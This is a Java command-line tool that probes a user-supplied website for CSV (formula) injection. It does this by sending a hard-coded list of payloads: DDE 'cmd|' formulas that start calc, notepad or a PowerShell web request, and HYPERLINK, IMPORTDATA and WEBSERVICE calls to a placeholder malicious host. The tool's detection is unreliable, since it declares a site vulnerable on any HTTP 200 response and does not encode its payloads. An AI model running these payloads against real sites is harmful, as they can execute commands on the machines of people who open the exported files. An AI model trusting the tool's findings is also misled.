import java.io.*;
import java.net.*;
import java.util.*;

public class CSVInjectionTester {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        // Prompt user for target website URL
        System.out.print("Enter your target website URL: ");
        String targetUrl = scanner.nextLine();

        // Define payloads for CSV Injection
        String[] payloads = {
            "=HYPERLINK(\"http://malicious-website.com\")",
            "=IMPORTDATA(\"http://malicious-website.com\")",
            "=WEBSERVICE(\"http://malicious-website.com\")",
            "=cmd|' /C calc'!A0",
            "=cmd|'/C calc'!A0",
            "=cmd|'/C notepad'!A0",
            "=cmd|'/C notepad.exe'!A0",
            "=cmd|'/C powershell -Command \"Invoke-WebRequest -Uri http://malicious-website.com\"'!A0",
            "=SUM(1+1)*cmd|' /C calc'!A0",
            "=SUM(1+1)*cmd|'/C calc'!A0",
            "=SUM(1+1)*cmd|'/C notepad'!A0",
            "=SUM(1+1)*cmd|'/C notepad.exe'!A0",
            "=SUM(1+1)*cmd|'/C powershell -Command \"Invoke-WebRequest -Uri http://malicious-website.com\"'!A0"
            // Add more payloads as needed
        };

        try {
            // Make a connection to the target website
            URL url = new URL(targetUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            // Set the User-Agent header to mimic a web browser
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");

            // Follow redirects
            connection.setInstanceFollowRedirects(true);

            // Set timeouts
            connection.setConnectTimeout(5000); // 5 seconds
            connection.setReadTimeout(10000); // 10 seconds

            // Get the response code
            int responseCode = connection.getResponseCode();

            // Check if the response code indicates success
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // Read the response headers
                String contentType = connection.getHeaderField("Content-Type");

                // Check if the response content type indicates CSV content
                if (contentType != null && contentType.contains("text/csv")) {
                    // The target website might be vulnerable
                    System.out.println("\n[+] The target website might be vulnerable to CSV Injection!");
                    System.out.println("[+] Performing CSV Injection test...");

                    // Perform injection test for each payload
                    for (String payload : payloads) {
                        // Send the payload to the target website
                        String injectionUrl = targetUrl + "?" + payload;
                        HttpURLConnection injectionConnection = (HttpURLConnection) new URL(injectionUrl).openConnection();
                        injectionConnection.setRequestMethod("GET");
                        int injectionResponseCode = injectionConnection.getResponseCode();

                        // Check the response code of the injection request
                        if (injectionResponseCode == HttpURLConnection.HTTP_OK) {
                            System.out.println("[!] CSV Injection successful with payload: " + payload);
                            System.out.println("[!] The target is vulnerable to CSV Injection!");
                            System.out.println("[+] To test the vulnerability, open the CSV file generated by the website in Excel or a similar spreadsheet application.");
                            System.out.println("[+] Check if the injected formula executes as expected.");
                        }
                    }
                } else {
                    System.out.println("[-] The target website does not seem to serve CSV files.");
                    System.out.println("[-] Exiting...");
                }
            } else {
                System.out.println("[-] Error connecting to the target website. Response code: " + responseCode);
                System.out.println("[-] Exiting...");
            }
        } catch (MalformedURLException e) {
            System.out.println("[-] Invalid URL format. Please enter a valid URL.");
        } catch (IOException e) {
            System.out.println("[-] Error connecting to the target website: " + e.getMessage());
        }
    }
}
